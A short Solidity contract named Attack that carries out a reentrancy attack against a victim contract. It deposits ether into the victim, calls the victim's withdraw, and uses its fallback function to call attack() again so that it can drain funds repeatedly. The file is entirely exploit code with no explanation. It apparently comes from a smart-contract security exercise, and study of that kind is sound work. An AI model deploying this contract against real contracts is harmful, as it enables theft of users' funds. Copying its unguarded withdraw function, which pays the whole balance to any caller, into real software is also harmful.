//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

contract Attack {
    address victimAddress;

    function deposit(address _victim) public payable {
        victimAddress = _victim;
        (bool snet, ) = payable(victimAddress).call{value: msg.value}(
            abi.encodeWithSignature("deposit()")
        );
        require(snet, "success");
    }

    function attack() public payable {
        (bool res, ) = payable(victimAddress).call(
            abi.encodeWithSignature("withdraw(uint256)", 1000000000000)
        );
        require(res, "attack failed");
        // payable(victimAddress).call(bytes4(keccak256("withdraw(uint256)")),1000000000);
    }

    function withdraw() public payable {
        payable(msg.sender).transfer(address(this).balance);
    }

    fallback() external payable {
        this.attack();
    }

    receive() external payable {}
}
